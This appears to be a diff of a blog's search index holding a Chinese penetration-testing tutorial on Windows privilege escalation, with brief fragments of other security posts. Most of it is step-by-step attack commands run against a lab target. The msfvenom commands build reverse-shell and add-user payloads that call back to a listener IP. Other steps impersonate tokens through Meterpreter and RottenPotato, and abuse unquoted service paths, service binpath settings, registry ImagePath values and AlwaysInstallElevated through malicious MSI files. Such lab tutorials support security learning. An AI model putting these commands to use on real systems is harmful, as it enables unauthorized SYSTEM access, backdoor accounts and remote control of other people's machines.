+<h6 id="privilege-escalation-awesome-scripts：winPEAS-bat"><a href="#privilege-escalation-awesome-scripts：winPEAS-bat" class="headerlink" title="privilege-escalation-awesome-scripts：winPEAS.bat"></a>privilege-escalation-awesome-scripts：winPEAS.bat</h6><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">https:<span class="regexp">//gi</span>thub.com<span class="regexp">/carlospolop/</span>privilege-escalation-awesome-scriptssuite<span class="regexp">/blob/m</span>aster<span class="regexp">/winPEAS/</span>winPEASbat/winPEAS.bat</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">https:<span class="regexp">//gi</span>thub.com<span class="regexp">/M4ximuss/</span>Powerless</span><br></pre></td></tr></table></figure>
+
+
+
+<h5 id="提权工具脚本"><a href="#提权工具脚本" class="headerlink" title="提权工具脚本"></a>提权工具脚本</h5><h6 id="RottenPotato：-将服务帐户本地提权至SYSTEM"><a href="#RottenPotato：-将服务帐户本地提权至SYSTEM" class="headerlink" title="RottenPotato： 将服务帐户本地提权至SYSTEM"></a>RottenPotato： 将服务帐户本地提权至SYSTEM</h6><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">load incognito</span><br><span class="line">list_token –u</span><br><span class="line">upload /root/rottenpotato.exe .</span><br><span class="line">execute <span class="literal">-Hc</span> <span class="operator">-f</span> rottenpotato.exe</span><br><span class="line">impersonate_token <span class="string">&quot;NT AUTHORITY\\SYSTEM&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/03/22/Windows%E4%B8%BB%E6%9C%BA%E6%8F%90%E6%9D%83/5.png">)</p>
+<p>基于RottenPotato二次开发的软件：</p>
+<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">Origin Potato : https:<span class="regexp">//gi</span>thub.com<span class="regexp">/foxglovesec/</span>Potato </span><br><span class="line"></span><br><span class="line">RottenPotato &amp; JuicyPotato: https:<span class="regexp">//gi</span>thub.com<span class="regexp">/ohpe/</span>juicy-potato </span><br><span class="line"></span><br><span class="line">RoguePotato: https:<span class="regexp">//gi</span>thub.com<span class="regexp">/antonioCoco/</span>RoguePotato </span><br><span class="line"></span><br><span class="line">SweetPotato: https:<span class="regexp">//gi</span>thub.com<span class="regexp">/CCob/</span>SweetPotato</span><br></pre></td></tr></table></figure>
+
+<h6 id="SweetPotato"><a href="#SweetPotato" class="headerlink" title="SweetPotato"></a>SweetPotato</h6><p><img src="/2021/03/22/Windows%E4%B8%BB%E6%9C%BA%E6%8F%90%E6%9D%83/6.png"></p>
+<h6 id="Getsystem"><a href="#Getsystem" class="headerlink" title="Getsystem"></a>Getsystem</h6><p><img src="/2021/03/22/Windows%E4%B8%BB%E6%9C%BA%E6%8F%90%E6%9D%83/7.png"></p>
+<h3 id="0x02-Windows内核漏洞提权"><a href="#0x02-Windows内核漏洞提权" class="headerlink" title="0x02 Windows内核漏洞提权"></a>0x02 Windows内核漏洞提权</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#检查Windows版本是否有任何已知的漏洞：</span></span><br><span class="line">systeminfo | findstr /B /C:<span class="string">&quot;OS Name&quot;</span> /C:<span class="string">&quot;OS Version“</span></span><br><span class="line"><span class="string">wmic qfe get Caption,Description,HotFixID,InstalledOn</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#列出所有补丁：</span></span><br><span class="line"><span class="string">powershell -c &quot;</span><span class="built_in">Get-WmiObject</span> <span class="literal">-query</span> <span class="string">&#x27;select * from win32_quickfixengineering&#x27;</span> | <span class="keyword">foreach</span> &#123;<span class="variable">$_</span>.hotfixid&#125;<span class="string">&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#列出安全更新补丁：</span></span><br><span class="line"><span class="string">powershell -c &quot;</span><span class="built_in">Get-Hotfix</span> <span class="literal">-description</span> <span class="string">&#x27;Security update&#x27;</span><span class="string">&quot;</span></span><br></pre></td></tr></table></figure>
+
+<h6 id="windows-kernel-exploits-Windows平台提权漏洞集合"><a href="#windows-kernel-exploits-Windows平台提权漏洞集合" class="headerlink" title="windows-kernel-exploits(Windows平台提权漏洞集合):"></a>windows-kernel-exploits(Windows平台提权漏洞集合):</h6><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">https:<span class="regexp">//gi</span>thub.com<span class="regexp">/SecWiki/</span>windows-kernel-exploits</span><br></pre></td></tr></table></figure>
+
+<h6 id="MSF"><a href="#MSF" class="headerlink" title="MSF"></a>MSF</h6><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">use post/multi/recon/local_exploit_suggester</span><br><span class="line"><span class="built_in">set</span> SESSION </span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/03/22/Windows%E4%B8%BB%E6%9C%BA%E6%8F%90%E6%9D%83/8.png"></p>
+<h4 id="0x03-Windows系统服务漏洞"><a href="#0x03-Windows系统服务漏洞" class="headerlink" title="0x03  Windows系统服务漏洞"></a>0x03  Windows系统服务漏洞</h4><h5 id="可信任服务路径"><a href="#可信任服务路径" class="headerlink" title="可信任服务路径"></a>可信任服务路径</h5><p>可信任服务路径：存在缺陷的服务程序利用属于可执行文件的文件/文件夹权限， Windows服务通常都是以System权限运行的，所以系统在解析服务的二进制文件对应的文件路径中的空格的时候 也会以系统权限进行解析。如果我们能利用这一特性，就有机会进行权限提升。</p>
+<p>例如：</p>
+<p>C:\Program Files (x86)\Windows Folder\Common Folder\Folder.exe </p>
+<figure class="highlight livescript"><table><tr><td class="code"><pre><span class="line">C:<span class="string">\Program.exe</span> </span><br><span class="line"></span><br><span class="line">C:<span class="string">\Program</span> Files (x86)<span class="string">\Windows.exe</span> </span><br><span class="line"></span><br><span class="line">C:<span class="string">\Program</span> Files (x86)<span class="string">\Windows</span> Folder<span class="string">\Common.exe</span> </span><br><span class="line"></span><br><span class="line">C:<span class="string">\Program</span> Files (x86)<span class="string">\Windows</span> Folder<span class="string">\Common</span> Folder<span class="string">\Folder.exe</span></span><br></pre></td></tr></table></figure>
+
+<p>Windows在寻找这个文件的时候，碰见空格会先找寻Program.exe这个文件，如果当前文件下没有Program.exe，则会继续向下走到第二个目录，碰见空格，又执行Windows.exe，以此类推，知道执行到Folder.exe。</p>
+<p>所以，我们可以通过查找系统服务文件中存在的非引用路径，如果一个服务调用可执行文件，没有正确处理引用的全路径名， 则可利用此漏洞。</p>
+<ol>
+<li><h6 id="检查目标主机是否可能存在漏洞："><a href="#检查目标主机是否可能存在漏洞：" class="headerlink" title="检查目标主机是否可能存在漏洞："></a>检查目标主机是否可能存在漏洞：</h6></li>
+</ol>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">wmic service get name,displayname,pathname,startmode|findstr /i <span class="string">&quot;Auto&quot;</span> |findstr /i /v <span class="string">&quot;C:\Windows\\&quot;</span></span><br><span class="line">|findstr/i /v <span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/03/22/Windows%E4%B8%BB%E6%9C%BA%E6%8F%90%E6%9D%83/9.png"></p>
+<ol start="2">
+<li><h6 id="检查对有漏洞目录是否有写入权限"><a href="#检查对有漏洞目录是否有写入权限" class="headerlink" title="检查对有漏洞目录是否有写入权限"></a>检查对有漏洞目录是否有写入权限</h6></li>
+</ol>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">icacls <span class="string">&quot;C:\Program Files (x86)\Program Folder&quot;</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>F = 完全控制 </p>
+<p>CI = 容器继承 - 此标志指示从属容器将继承此ACE。 </p>
+<p>OI = Object Inherit - 这个标志表示从属文件将继承ACE</p>
+</blockquote>
+<p><img src="/2021/03/22/Windows%E4%B8%BB%E6%9C%BA%E6%8F%90%E6%9D%83/10.png"></p>
+<ol start="3">
+<li><h6 id="生成payload"><a href="#生成payload" class="headerlink" title="生成payload"></a>生成payload</h6></li>
+</ol>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">msfvenom <span class="literal">-p</span> windows/meterpreter/reverse_tcp LHOST=<span class="number">192.168</span>.<span class="number">31.246</span> LPORT=<span class="number">9999</span> <span class="operator">-f</span> exe <span class="literal">-o</span> A.exe</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/03/22/Windows%E4%B8%BB%E6%9C%BA%E6%8F%90%E6%9D%83/11.png"></p>
+<ol start="4">
+<li><h6 id="上传exe到漏洞目录"><a href="#上传exe到漏洞目录" class="headerlink" title="上传exe到漏洞目录"></a>上传exe到漏洞目录</h6></li>
+</ol>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">upload A.exe “C:\Program Files (x86)\Program Folder\<span class="string">&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/03/22/Windows%E4%B8%BB%E6%9C%BA%E6%8F%90%E6%9D%83/12.png"></p>
+<ol start="5">
+<li><h6 id="开启监听"><a href="#开启监听" class="headerlink" title="开启监听"></a>开启监听</h6></li>
+</ol>
+<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">handler</span> -H <span class="number">192.168.31.246</span> -P <span class="number">9999</span> -p windows/meterpreter/reverse_tcp</span><br></pre></td></tr></table></figure>
+
+<ol start="6">
+<li><h6 id="重启服务"><a href="#重启服务" class="headerlink" title="重启服务"></a>重启服务</h6></li>
+</ol>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sc</span> stop <span class="string">&quot;Vulnerable Service”</span></span><br><span class="line"><span class="string">sc start &quot;</span>Vulnerable Service</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/03/22/Windows%E4%B8%BB%E6%9C%BA%E6%8F%90%E6%9D%83/13.png"></p>
+<ol start="7">
+<li><h6 id="设置自动迁移进程，重新开启监听，获取meterpreter"><a href="#设置自动迁移进程，重新开启监听，获取meterpreter" class="headerlink" title="设置自动迁移进程，重新开启监听，获取meterpreter"></a>设置自动迁移进程，重新开启监听，获取meterpreter</h6></li>
+</ol>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> payload windows/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> lport <span class="number">9999</span></span><br><span class="line"><span class="built_in">set</span> lhost <span class="number">192.168</span>.<span class="number">31.246</span></span><br><span class="line"><span class="built_in">set</span> autorunscript migrate –f</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/03/22/Windows%E4%B8%BB%E6%9C%BA%E6%8F%90%E6%9D%83/14.png"></p>
+<h5 id="不安全的服务权限"><a href="#不安全的服务权限" class="headerlink" title="不安全的服务权限"></a>不安全的服务权限</h5><p>Windows系统服务文件在操作系统启动时会加载执行，并且在后台调用可执行文件。</p>
+<p>JAVA升级程序，每次重启系统时，JAVA升级程序会检测Oracle网站，是否有新版JAVA程序。 而类似JAVA程序之类的系统服务程序加载时往往都是运行在系统权限上的。</p>
+<p>所以如果一个低权限的用户对于此类 系统服务调用的可执行文件具有可写的权限，那么就可以修改服务的属性，将其替换成我们的恶意可执行文件，从 而随着系统启动服务而获得系统权限。</p>
+<ol>
+<li><h6 id="利用accesschk工具检查易受到攻击的服务"><a href="#利用accesschk工具检查易受到攻击的服务" class="headerlink" title="利用accesschk工具检查易受到攻击的服务"></a>利用accesschk工具检查易受到攻击的服务</h6><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">accesschk64.exe <span class="literal">-ucqv</span> “LYXC<span class="string">&quot; * /accepteula</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/03/22/Windows%E4%B8%BB%E6%9C%BA%E6%8F%90%E6%9D%83/15.png"></p>
+</li>
+<li><h6 id="查看可完全控制的服务的属性"><a href="#查看可完全控制的服务的属性" class="headerlink" title=".查看可完全控制的服务的属性"></a>.查看可完全控制的服务的属性</h6><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sc</span> qc <span class="string">&quot;Vulnerable Service&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/03/22/Windows%E4%B8%BB%E6%9C%BA%E6%8F%90%E6%9D%83/16.png"></p>
+</li>
+<li><h6 id="修改服务配置执行命令binpath"><a href="#修改服务配置执行命令binpath" class="headerlink" title="修改服务配置执行命令binpath"></a>修改服务配置执行命令binpath</h6><p>BINARY_PATH_NAME参数指向了该服务的可执行程序(Executable.exe)路径。如果我们将这个值修改成任何命令， 那意味着这个命令在该服务下一次启动时，将会以SYSTEM权限运行</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sc</span> config <span class="string">&quot;Vulnerable Service&quot;</span> binpath= <span class="string">&quot;net user zhangsan 123456 /add&quot;</span></span><br><span class="line"><span class="built_in">sc</span> stop <span class="string">&quot;Vulnerable Service&quot;</span></span><br><span class="line"><span class="built_in">sc</span> <span class="built_in">start</span> <span class="string">&quot;Vulnerable Service&quot;</span> </span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/03/22/Windows%E4%B8%BB%E6%9C%BA%E6%8F%90%E6%9D%83/17.png"></p>
+<blockquote>
+<p>Authenticated Users：指Windows系统中所有使用用户名、密码登录并通过身份验证的账户，不包括来宾账户 Guest。也可以使用当前用户用户名来列出所有可以被当前用户修改的服务。 </p>
+<p>SERVICE_ALL_ACCESS：意思是我们对 Vulnerable Service 的属性拥有完全控制权 </p>
+<p>BINARY_PATH_NAME：参数指向了该服务的可执行程序路径。如果我们将这个值修改成任何命令，那意味着这个 命令在该服务下一次启动时，将会以SYSTEM权限运行。</p>
+</blockquote>
+</li>
+</ol>
+<h5 id="不安全的注册表权限"><a href="#不安全的注册表权限" class="headerlink" title="不安全的注册表权限"></a>不安全的注册表权限</h5><p>Windows中,与服务相关的信息存在 <code>HKLM[HKEY_LOCAL_MACHINE]\SYSTEM\CurrentControlSet\Services</code> 注册表中。 如果想查看有关 “易受攻击的服务”的信息，应该检查 <code>HKLM\SYSTEM\ControlSet\Services\Vulnerable Service</code> 的键值。</p>
+<h6 id="工具：-Subinacl"><a href="#工具：-Subinacl" class="headerlink" title="工具： Subinacl"></a>工具： Subinacl</h6><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">https:<span class="regexp">//</span>www.microsoft.com<span class="regexp">/en-us/</span>download/details.aspx?id=<span class="number">23510</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">subinacl.exe /keyreg <span class="string">&quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Vulnerable Service&quot;</span> /display</span><br></pre></td></tr></table></figure>
+
+<p>如果对注册表项有写入权限，我们可以通过编辑ImagePath值来更改此服务的可执行路径。</p>
+<p><img src="/2021/03/22/Windows%E4%B8%BB%E6%9C%BA%E6%8F%90%E6%9D%83/18.png"></p>
+<ol>
+<li><h6 id="msfvenom生成木马"><a href="#msfvenom生成木马" class="headerlink" title="msfvenom生成木马"></a>msfvenom生成木马</h6><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">msfvenom <span class="literal">-p</span> windows/adduser USER=hacker PASS=Hacker123<span class="variable">$</span> <span class="operator">-f</span> exe &gt; adduser.exe</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/03/22/Windows%E4%B8%BB%E6%9C%BA%E6%8F%90%E6%9D%83/19.png"></p>
+</li>
+<li><h6 id="上传到机器上"><a href="#上传到机器上" class="headerlink" title="上传到机器上"></a>上传到机器上</h6><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">upload adduser.exe C:\\Windows\\Temp\\</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/03/22/Windows%E4%B8%BB%E6%9C%BA%E6%8F%90%E6%9D%83/20.png"></p>
+</li>
+<li><h6 id="执行修改命令"><a href="#执行修改命令" class="headerlink" title="执行修改命令"></a>执行修改命令</h6><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">reg add <span class="string">&quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Vulnerable Service&quot;</span> /t REG_EXPAND_SZ /v ImagePath /d <span class="string">&quot;C:\Windows\Temp\adduser.exe&quot;</span> /f</span><br></pre></td></tr></table></figure>
+
+<p>注册表被成功替换</p>
+<p><img src="/2021/03/22/Windows%E4%B8%BB%E6%9C%BA%E6%8F%90%E6%9D%83/21.png"></p>
+</li>
+<li><h6 id="重新启动服务，用户被成功添加"><a href="#重新启动服务，用户被成功添加" class="headerlink" title="重新启动服务，用户被成功添加"></a>重新启动服务，用户被成功添加</h6><p><img src="/2021/03/22/Windows%E4%B8%BB%E6%9C%BA%E6%8F%90%E6%9D%83/22.png"></p>
+</li>
+</ol>
+<h5 id="不安全的文件-文件夹权限"><a href="#不安全的文件-文件夹权限" class="headerlink" title="不安全的文件/文件夹权限"></a>不安全的文件/文件夹权限</h5><p>这与我们用非引用服务路径所做的非常相似。无引号的服务路径利用了“CreateProcess”功能的弱点，以及服务 的可执行文件路径的文件夹权限。 </p>
+<p>在这里可以直接替换可执行文件。 </p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">icacls <span class="string">&quot;C:\Program Files (x86)\Program Folder&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p> 默认的服务文件是C:\Program Files (x86)\Program Folder\A Subfolder\Executable.exe 将“Executable.exe”文件替换成一个反弹shell payload，并且当服务重启时，会反弹一个SYSTEM权限的 meterpreter 会话</p>
+<h5 id="Always-Install-Elevated"><a href="#Always-Install-Elevated" class="headerlink" title="Always Install Elevated"></a>Always Install Elevated</h5><p>任意用户以NT AUTHORITY\SYSTEM权限安装msi。</p>
+<p>AlwaysInstallElevated是一个策略设置，当在系统中使用Windows Installer安装任何程序时，该参数允许非特权 用户以system权限运行MSI文件。如果目标系统上启用了这一设置，我们可以使用msf生成msi文件来以system权 限执行任意payload。</p>
+<h6 id="判断是否启用此策略设置："><a href="#判断是否启用此策略设置：" class="headerlink" title="判断是否启用此策略设置："></a>判断是否启用此策略设置：</h6><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">reg query HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated</span><br><span class="line"></span><br><span class="line">reg query HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer /v</span><br><span class="line">AlwaysInstallElevated</span><br></pre></td></tr></table></figure>
+
+<p>收到“错误：系统无法找到指定的注册表项或值”的错误，则表示此注册表值从未创建。 说明政策没有启用。 </p>
+<p>收到“AlwaysInstallElevated REG_DWORD 0x1”，说明策略已经启用。</p>
+<h6 id="启用Always-Install-Elevated"><a href="#启用Always-Install-Elevated" class="headerlink" title="启用Always Install Elevated:"></a>启用Always Install Elevated:</h6><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">reg add HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated /t REG_DWORD /d <span class="number">1</span> </span><br><span class="line">reg add HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated /t</span><br><span class="line">REG_DWORD /d <span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<ol>
+<li><h6 id="使用msfvenom生成恶意msi程序上传"><a href="#使用msfvenom生成恶意msi程序上传" class="headerlink" title="使用msfvenom生成恶意msi程序上传"></a>使用msfvenom生成恶意msi程序上传</h6></li>
+</ol>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">msfvenom <span class="literal">-p</span> windows/meterpreter/reverse_tcp LHOST=<span class="number">192.168</span>.<span class="number">31.246</span> LPORT=<span class="number">8881</span> <span class="operator">-f</span> exe <span class="literal">-o</span> localmsf8881.exe</span><br><span class="line"></span><br><span class="line"><span class="comment">#反弹shell</span></span><br><span class="line">msfvenom <span class="operator">-f</span> msi<span class="literal">-nouac</span> <span class="literal">-p</span> windows/exec cmd=<span class="string">&quot;C:\Users\LYXC\AppData\Local\Temp\localmsf8882.exe&quot;</span> &gt; malicious.msi</span><br><span class="line"></span><br><span class="line"><span class="comment">#添加用户</span></span><br><span class="line">msfvenom <span class="literal">-p</span> windows/adduser USER=test PASS=Password@<span class="number">123</span> -<span class="literal">-platform</span> windows <span class="literal">-a</span> x86 <span class="operator">-f</span> msinouac <span class="literal">-o</span> test.msi</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/03/22/Windows%E4%B8%BB%E6%9C%BA%E6%8F%90%E6%9D%83/23.png"></p>
+<ol start="2">
+<li><h6 id="将这两个上传到目标机器"><a href="#将这两个上传到目标机器" class="headerlink" title="将这两个上传到目标机器"></a>将这两个上传到目标机器</h6></li>
+</ol>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; upload localmsf8881.exe C:\\Users\\LYXC\\AppData\\Local\\Temp\\</span><br><span class="line">meterpreter &gt; upload malicious.msi C:\\Users\\LYXC\\AppData\\Local\\Temp\\</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/03/22/Windows%E4%B8%BB%E6%9C%BA%E6%8F%90%E6%9D%83/24.png"></p>
+<ol start="3">
+<li><h6 id="运行恶意程序"><a href="#运行恶意程序" class="headerlink" title="运行恶意程序"></a>运行恶意程序</h6></li>
+</ol>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">msiexec /quiet /qn /i C:\Users\LYXC\AppData\Local\temp\malicious.msi</span><br><span class="line"></span><br><span class="line"><span class="comment"># /quiet 安装过程中禁止向用户发送消息</span></span><br><span class="line"><span class="comment"># /qn 不使用GUI</span></span><br><span class="line"><span class="comment"># /i 安装程序</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/03/22/Windows%E4%B8%BB%E6%9C%BA%E6%8F%90%E6%9D%83/25.png"></p>
+<p>直接收到了第二个session</p>
+<p><img src="/2021/03/22/Windows%E4%B8%BB%E6%9C%BA%E6%8F%90%E6%9D%83/26.png"></p>
+<p>但是权限依然只是LYXC，并不是System的最高权限，是因为Metasploit生成的msi文件 在运行时没有要求提升权限，所以导致了这个问题，这时可以使用微软官方的MSI生成工具</p>
+<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">https</span>://www.exemsi.com/downloads/msi_wrapper/MSI_Wrapper_<span class="number">9</span>_<span class="number">0</span>_<span class="number">42</span>_<span class="number">0</span>.msi</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/03/22/Windows%E4%B8%BB%E6%9C%BA%E6%8F%90%E6%9D%83/27.png"></p>
+<p>上传malicious.msi至靶机，运行恶意程序</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">msiexec /quiet /qn /i C:\Users\anthus\AppData\Local\temp\malicious.msi</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/03/22/Windows%E4%B8%BB%E6%9C%BA%E6%8F%90%E6%9D%83/28.png"></p>
+<p>成功提权</p>
+]]></content>
+      <categories>
+        <category>渗透测试</category>
+      </categories>
+      <tags>
+        <tag>渗透测试</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>使用burp进行暴力破解</title>
     <url>/2021/02/21/%E4%BD%BF%E7%94%A8burp%E8%BF%9B%E8%A1%8C%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/</url>
     <content><![CDATA[<h3 id="成殇Orz1"><a href="#成殇Orz1" class="headerlink" title="成殇Orz1"></a>成殇Orz1</h3><h3 id="0x00-Burp的工作模式"><a href="#0x00-Burp的工作模式" class="headerlink" title="0x00 Burp的工作模式"></a>0x00 <strong>Burp的工作模式</strong></h3><p>​    在没有burp之前，客户端使用浏览器直接与服务器进行通信。有了burp之后，burp在客户端与服务器之间充当代理。这样，浏览器发送给服务器的请求就会被burp进行捕获，而burp和wireshark这种审计类工具相比，其强大之处在于不仅可以做审计工作，更可以对数据包进行修改并发送出去。使用了burp的结构如下图所示。</p>
@@ -1047,232 +1390,6 @@
         <tag>Web</tag>
         <tag>渗透测试</tag>
         <tag>信息收集</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Windows提权</title>
-    <url>/2021/03/22/Windows%E4%B8%BB%E6%9C%BA%E6%8F%90%E6%9D%83/</url>
-    <content><![CDATA[<h3 id="成殇Orz1"><a href="#成殇Orz1" class="headerlink" title="成殇Orz1"></a>成殇Orz1</h3><h3 id="0x00-权限提升概述"><a href="#0x00-权限提升概述" class="headerlink" title="0x00 权限提升概述"></a>0x00 权限提升概述</h3><h5 id="提权概述"><a href="#提权概述" class="headerlink" title="提权概述"></a>提权概述</h5><p>权限提升（privilege escalation）：攻击者通过安全漏洞把获取到的受限制的低权限用户突破限制，提权至高权限 的管理员用户，从而获得对整个系统得控制权。 </p>
-<span id="more"></span>
-
-<h5 id="Windows系统内置用户和组"><a href="#Windows系统内置用户和组" class="headerlink" title="Windows系统内置用户和组"></a>Windows系统内置用户和组</h5><p>内置用户：</p>
-<ul>
-<li><p>Administrator：系统管理员账户，拥有完全的控制权限</p>
-</li>
-<li><p>Guest：来宾账户，供访问共享资源的网络用户使用，仅有最基本的权限，默认被禁用</p>
-</li>
-</ul>
-<p>内置用户组：</p>
-<ul>
-<li><p>Administrators：管理员组</p>
-</li>
-<li><p>Users：新建用的默认所属的组</p>
-</li>
-<li><p>Guests：来宾组，权限最低</p>
-</li>
-</ul>
-<figure class="highlight crmsh"><table><tr><td class="code"><pre><span class="line">Windows：<span class="keyword">user</span> <span class="title">--&gt; administrator</span></span><br><span class="line">Linux：<span class="keyword">user</span> <span class="title">--&gt; root</span></span><br></pre></td></tr></table></figure>
-
-<h5 id="提权分类"><a href="#提权分类" class="headerlink" title="提权分类"></a>提权分类</h5><p>本地提权：在一个低权限用户下，通过一些条件（应用程序漏洞、系统漏洞等）直接提升到系统最高权限。 </p>
-<p>远程提权：攻击者通过漏洞利用程序直接获取远程服务器的权限。</p>
-<p>纵向提权：低权限角色获得高权限角色的权限。</p>
-<p>横向提权：获取同级别角色的权限。</p>
-<h5 id="提权条件"><a href="#提权条件" class="headerlink" title="提权条件"></a>提权条件</h5><ul>
-<li>拥有Webshell，普通用户权限 </li>
-<li>拥有某些软件的账号密码 </li>
-<li>本地或远程服务器上存在漏洞 </li>
-<li>拥有漏洞利用工具代码</li>
-</ul>
-<h5 id="Windows提权思路-•"><a href="#Windows提权思路-•" class="headerlink" title="Windows提权思路 •"></a>Windows提权思路 •</h5><ul>
-<li>前期信息收集 </li>
-<li>Meterpreter提权 </li>
-<li>Windows系统内核漏洞 </li>
-<li>Windows服务漏洞 </li>
-<li>Windwos注册表</li>
-</ul>
-<h3 id="0x01-Windows提权信息收集"><a href="#0x01-Windows提权信息收集" class="headerlink" title="0x01 Windows提权信息收集"></a>0x01 Windows提权信息收集</h3><h5 id="获取meterpreter"><a href="#获取meterpreter" class="headerlink" title="获取meterpreter"></a>获取meterpreter</h5><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">msfvenom <span class="literal">-p</span> windows/meterpreter/reverse_tcp lhost=<span class="number">192.168</span>.<span class="number">31.246</span> lport=<span class="number">8882</span> <span class="operator">-f</span> exe <span class="literal">-o</span> xx.exe <span class="literal">-e</span></span><br><span class="line">x86/shikata_ga_nai <span class="literal">-i</span> <span class="number">8</span></span><br><span class="line"></span><br><span class="line">handler <span class="literal">-p</span> windows/meterpreter/reverse_tcp <span class="literal">-H</span> <span class="number">192.168</span>.<span class="number">31.246</span> <span class="literal">-P</span> <span class="number">8882</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/2021/03/22/Windows%E4%B8%BB%E6%9C%BA%E6%8F%90%E6%9D%83/1.png"></p>
-<h5 id="WMIC信息收集"><a href="#WMIC信息收集" class="headerlink" title="WMIC信息收集"></a>WMIC信息收集</h5><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#获取杀软名：</span></span><br><span class="line">WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List</span><br><span class="line"><span class="comment">#获取杀软名和安装路径：</span></span><br><span class="line">WMIC /namespace:\\root\securitycenter2 path antivirusproduct GET displayName,productState,pathToSignedProductExe</span><br><span class="line">wmic <span class="built_in">group</span>				<span class="comment">#组帐户管理。</span></span><br><span class="line">wmic os					<span class="comment">#已安装操作系统的管理。</span></span><br><span class="line">wmic <span class="keyword">process</span>				<span class="comment">#进程管理</span></span><br><span class="line">wmic service				<span class="comment">#服务应用程序管理。</span></span><br><span class="line">wmic useraccount			<span class="comment">#用户帐户管理。</span></span><br><span class="line">wmic startup				<span class="comment">#当用户登录到计算机系统时自动运行的命令的管理。</span></span><br><span class="line">wmic nic				<span class="comment">#网络接口控制器(NIC)管理</span></span><br></pre></td></tr></table></figure>
-
-<h6 id="wmic信息提取脚本：wmic-info-bat"><a href="#wmic信息提取脚本：wmic-info-bat" class="headerlink" title="wmic信息提取脚本：wmic_info.bat"></a>wmic信息提取脚本：wmic_info.bat</h6><p><img src="/2021/03/22/Windows%E4%B8%BB%E6%9C%BA%E6%8F%90%E6%9D%83/2.png"></p>
-<h5 id="SC信息收集"><a href="#SC信息收集" class="headerlink" title="SC信息收集"></a>SC信息收集</h5><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sc</span> query state= all</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2021/03/22/Windows%E4%B8%BB%E6%9C%BA%E6%8F%90%E6%9D%83/3.png"></p>
